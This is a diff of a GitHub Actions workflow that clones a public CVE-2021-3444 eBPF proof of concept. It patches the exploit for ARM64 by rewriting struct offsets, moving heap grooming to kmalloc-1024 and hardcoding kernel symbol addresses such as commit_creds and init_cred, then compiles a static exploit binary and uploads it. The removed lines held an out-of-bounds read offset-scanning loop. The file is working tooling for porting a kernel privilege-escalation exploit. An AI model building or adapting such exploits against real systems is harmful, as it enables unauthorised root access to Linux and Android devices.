@@ -1,4 +1,4 @@
-name: botti_arm64_scan_offsets
+name: botti_arm64_defrag_1024
 on: [push, workflow_dispatch]
 
 jobs:
@@ -12,82 +12,41 @@ jobs:
           sudo apt-get update -y
           sudo apt-get install -y gcc make git
 
-      - name: Clone and patch PoC
+      - name: Clone and patch PoC for ARM64 kmalloc-1024
         run: |
           git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
           cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
           
-          # Patch ARM64 offsets (struct bpf_array is 320 bytes on ARM64, not 208)
+          # Patch struct size and defrag for kmalloc-1024
           sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 320|' exploit.c
-          sed -i 's|#define MAP_VALUE_SIZE 256|#define MAP_VALUE_SIZE 256|' exploit.c
           
-          # Replace the single OPS_OFFSET read with a loop over multiple offsets
-          # Find the line: uint64_t leaked_ops = do_oob_read_at(victim_fd, result_fd, OPS_OFFSET);
-          # And replace with a scan loop
-          python3 << 'PYEOF'
-          import re
+          # Patch the defrag loop - create maps with bigger values (512 instead of 256)
+          # so they go into kmalloc-1024 instead of kmalloc-512
+          sed -i 's|MAP_VALUE_SIZE 256|MAP_VALUE_SIZE 512|' exploit.c
           
-          with open('exploit.c', 'r') as f:
-              content = f.read()
+          # The key: change "Defragmented kmalloc-512 with 100 array maps" 
+          # to use value_size=512 (which means each map is 320+512=832 bytes -> kmalloc-1024)
           
-          # The original single read
-          old_read = 'uint64_t leaked_ops = do_oob_read_at(victim_fd, result_fd, OPS_OFFSET);'
-          
-          # New scan that tests many offsets
-          new_read = '''uint64_t leaked_ops = 0;
-            int found_offset = -1;
-            int scan_offsets[] = {256, 320, 384, 448, 512, 576, 640, 704, 768, 832, 896, 960, 1024, 1088, 1152, 1216, 1280, 1344, 1408, 1472, 1536, 1600, 1664, 1728, 1792, 1856, 1920, 1984};
-            int num_offsets = sizeof(scan_offsets) / sizeof(scan_offsets[0]);
-            printf("[*] Scanning %d offsets for OOB read...\\n", num_offsets);
-            for (int _i = 0; _i < num_offsets; _i++) {
-                uint64_t _v = do_oob_read_at(victim_fd, result_fd, scan_offsets[_i]);
-                if (_v != 0) {
-                    printf("  [HIT] offset %d: 0x%016lx\\n", scan_offsets[_i], _v);
-                    if (found_offset < 0) {
-                        leaked_ops = _v;
-                        found_offset = scan_offsets[_i];
-                    }
-                }
-            }
-            if (found_offset < 0) {
-                printf("  [MISS] All offsets returned 0x0 - OOB read is blocked\\n");
-            } else {
-                printf("  [+] Using offset %d: 0x%016lx\\n", found_offset, leaked_ops);
-            }'''
-          
-          if old_read in content:
-              content = content.replace(old_read, new_read)
-              print("SUCCESS: replaced single read with scan loop")
-          else:
-              print("ERROR: could not find the single read line")
-              # Print what we're looking for
-              for line in content.split('\n'):
-                  if 'do_oob_read_at' in line and 'leaked_ops' in line:
-                      print(f"  Found similar line: {line.strip()}")
-              exit(1)
-          
-          with open('exploit.c', 'w') as f:
-              f.write(content)
-          PYEOF
-          
-          echo "=== Verify scan was inserted ==="
-          grep -A 5 "Scanning %d offsets" exploit.c || echo "NOT FOUND"
-          
-          # Also patch symbol addresses to ARM64
+          # Patch ARM64 symbols
           sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
           sed -i 's|#define ARRAY_MAP_OPS 0xffffffff81a1c8c0ULL|#define ARRAY_MAP_OPS 0xffffff8008f5d500ULL|' exploit.c
           sed -i 's|#define ARRAY_OF_MAPS_MAP_OPS 0xffffffff81a1c640ULL|#define ARRAY_OF_MAPS_MAP_OPS 0xffffff8008f5d780ULL|' exploit.c
           sed -i 's|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffffff810e32d0ULL|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffff80081d6cecULL|' exploit.c
           sed -i 's|#define COMMIT_CREDS 0xffffffff81072470ULL|#define COMMIT_CREDS 0xffffff80080e03dcULL|' exploit.c
           sed -i 's|#define INIT_CRED 0xffffffff81e355e0ULL|#define INIT_CRED 0xffffff8009787f48ULL|' exploit.c
+          
+          # Also: OUTER_MAX_ENTRIES should be 16 (16*8=128 bytes) - keep as is
+          
+          echo "=== Verify patches ==="
+          grep -E "BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OUTER_MAX_ENTRIES|OPS_OFFSET" exploit.c
 
       - name: Compile
         run: |
           cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_scan
-          ls -la exploit_scan
+          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_1024
+          ls -la exploit_1024
 
       - uses: actions/upload-artifact@v4
         with:
-          name: botti-scan-offsets
-          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_scan
+          name: botti-arm64-1024
+          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_1024
